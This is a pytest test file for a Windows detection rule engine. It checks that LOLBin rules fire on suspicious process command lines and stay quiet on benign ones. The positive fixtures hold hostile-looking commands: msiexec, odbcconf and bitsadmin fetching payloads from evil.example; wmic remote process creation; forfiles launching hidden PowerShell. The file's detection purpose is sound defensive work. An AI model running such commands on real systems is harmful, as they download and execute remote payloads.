"""Phase 4A Subphase 3 — LOLBin rule expansion tests."""

from __future__ import annotations

from pathlib import Path

import pytest
from normalizer.models import ProcessCreateEvent
from rules.engine import RuleEngine

MSIEXEC = r"C:\Windows\System32\msiexec.exe"
ODBCCONF = r"C:\Windows\System32\odbcconf.exe"
CMSTP = r"C:\Windows\System32\cmstp.exe"
HH = r"C:\Windows\System32\hh.exe"
REGASM = r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe"
WMIC = r"C:\Windows\System32\wbem\wmic.exe"
BITSADMIN = r"C:\Windows\System32\bitsadmin.exe"
INSTALLUTIL = r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\installutil.exe"
FORFILES = r"C:\Windows\System32\forfiles.exe"
EXPLORER = r"C:\Windows\explorer.exe"


def _make_process_event(**kwargs) -> ProcessCreateEvent:
    defaults: dict = {
        "event_id": 1,
        "utc_time": "2026-07-07 10:00:00.000",
        "computer": "TEST-HOST",
        "process_guid": "{test-guid}",
        "process_id": 2233,
        "image": EXPLORER,
        "command_line": "explorer.exe",
        "current_directory": "C:\\",
        "user": "TEST-HOST\\User",
        "parent_process_id": 1122,
        "parent_image": r"C:\Windows\System32\cmd.exe",
        "parent_command_line": "cmd.exe",
        "integrity_level": "Medium",
        "hashes": None,
    }
    defaults.update(kwargs)
    return ProcessCreateEvent(**defaults)


def _hits(engine: RuleEngine, event: ProcessCreateEvent, rule_id: str) -> bool:
    return any(h.rule_id == rule_id for h in engine.evaluate(event))


@pytest.fixture(scope="module")
def engine() -> RuleEngine:
    eng = RuleEngine(Path("rules"))
    eng.load()
    return eng


# ---------------------------------------------------------------------------
# LOLBIN_MSIEXEC_REMOTE_001
# ---------------------------------------------------------------------------


def test_lolbin_msiexec_remote_fires(engine: RuleEngine):
    event = _make_process_event(
        image=MSIEXEC,
        command_line="msiexec.exe /i https://evil.example/payload.msi /qn",
    )
    assert _hits(engine, event, "LOLBIN_MSIEXEC_REMOTE_001")


def test_lolbin_msiexec_remote_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        image=MSIEXEC,
        command_line="msiexec.exe /i C:\\Installers\\legit.msi /qn",
    )
    assert not _hits(engine, event, "LOLBIN_MSIEXEC_REMOTE_001")


# ---------------------------------------------------------------------------
# LOLBIN_ODBCCONF_001
# ---------------------------------------------------------------------------


def test_lolbin_odbcconf_fires(engine: RuleEngine):
    event = _make_process_event(
        image=ODBCCONF,
        command_line="odbcconf.exe /a {regsvr} /f http://evil.example/payload.dll",
    )
    assert _hits(engine, event, "LOLBIN_ODBCCONF_001")


def test_lolbin_odbcconf_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        image=ODBCCONF,
        command_line="odbcconf.exe /s /lv C:\\logs\\odbc.log",
    )
    assert not _hits(engine, event, "LOLBIN_ODBCCONF_001")


# ---------------------------------------------------------------------------
# LOLBIN_CMSTP_001
# ---------------------------------------------------------------------------


def test_lolbin_cmstp_fires(engine: RuleEngine):
    event = _make_process_event(
        image=CMSTP,
        command_line="cmstp.exe /s C:\\temp\\profile.inf",
    )
    assert _hits(engine, event, "LOLBIN_CMSTP_001")


def test_lolbin_cmstp_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        image=EXPLORER,
        command_line="explorer.exe C:\\",
    )
    assert not _hits(engine, event, "LOLBIN_CMSTP_001")


# ---------------------------------------------------------------------------
# LOLBIN_HH_CHM_001
# ---------------------------------------------------------------------------


def test_lolbin_hh_chm_fires(engine: RuleEngine):
    event = _make_process_event(
        image=HH,
        command_line="hh.exe javascript:alert('x')",
    )
    assert _hits(engine, event, "LOLBIN_HH_CHM_001")


def test_lolbin_hh_chm_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        image=HH,
        command_line="hh.exe C:\\Windows\\Help\\mui\\0409\\aclui.chm",
    )
    assert not _hits(engine, event, "LOLBIN_HH_CHM_001")


# ---------------------------------------------------------------------------
# LOLBIN_REGASM_REGSVCS_001
# ---------------------------------------------------------------------------


def test_lolbin_regasm_regsvcs_fires(engine: RuleEngine):
    event = _make_process_event(
        image=REGASM,
        command_line="regasm.exe /u C:\\temp\\evil.dll",
    )
    assert _hits(engine, event, "LOLBIN_REGASM_REGSVCS_001")


def test_lolbin_regasm_regsvcs_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        image=EXPLORER,
        command_line="explorer.exe C:\\",
    )
    assert not _hits(engine, event, "LOLBIN_REGASM_REGSVCS_001")


# ---------------------------------------------------------------------------
# LOLBIN_WMIC_PROCESS_001
# ---------------------------------------------------------------------------


def test_lolbin_wmic_process_fires(engine: RuleEngine):
    event = _make_process_event(
        image=WMIC,
        command_line="wmic.exe /node:10.0.0.5 process call create \"cmd.exe /c whoami\"",
    )
    assert _hits(engine, event, "LOLBIN_WMIC_PROCESS_001")


def test_lolbin_wmic_process_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        image=WMIC,
        command_line="wmic.exe os get caption",
    )
    assert not _hits(engine, event, "LOLBIN_WMIC_PROCESS_001")


# ---------------------------------------------------------------------------
# LOLBIN_BITSADMIN_001
# ---------------------------------------------------------------------------


def test_lolbin_bitsadmin_fires(engine: RuleEngine):
    event = _make_process_event(
        image=BITSADMIN,
        command_line=(
            "bitsadmin.exe /transfer JobName "
            "https://evil.example/payload.exe C:\\temp\\payload.exe"
        ),
    )
    assert _hits(engine, event, "LOLBIN_BITSADMIN_001")


def test_lolbin_bitsadmin_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        image=BITSADMIN,
        command_line="bitsadmin.exe /list /allusers",
    )
    assert not _hits(engine, event, "LOLBIN_BITSADMIN_001")


# ---------------------------------------------------------------------------
# LOLBIN_INSTALLUTIL_001
# ---------------------------------------------------------------------------


def test_lolbin_installutil_fires(engine: RuleEngine):
    event = _make_process_event(
        image=INSTALLUTIL,
        command_line="installutil.exe C:\\temp\\evil.dll",
    )
    assert _hits(engine, event, "LOLBIN_INSTALLUTIL_001")


def test_lolbin_installutil_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        image=EXPLORER,
        command_line="explorer.exe C:\\",
    )
    assert not _hits(engine, event, "LOLBIN_INSTALLUTIL_001")


# ---------------------------------------------------------------------------
# LOLBIN_FORFILES_001
# ---------------------------------------------------------------------------


def test_lolbin_forfiles_fires(engine: RuleEngine):
    event = _make_process_event(
        image=FORFILES,
        command_line="forfiles.exe /p C:\\ /m *.txt /c cmd /c powershell -nop -w hidden",
    )
    assert _hits(engine, event, "LOLBIN_FORFILES_001")


def test_lolbin_forfiles_does_not_fire_on_benign(engine: RuleEngine):
    event = _make_process_event(
        image=FORFILES,
        command_line="forfiles.exe /p C:\\logs /m *.log /c echo @file",
    )
    assert not _hits(engine, event, "LOLBIN_FORFILES_001")
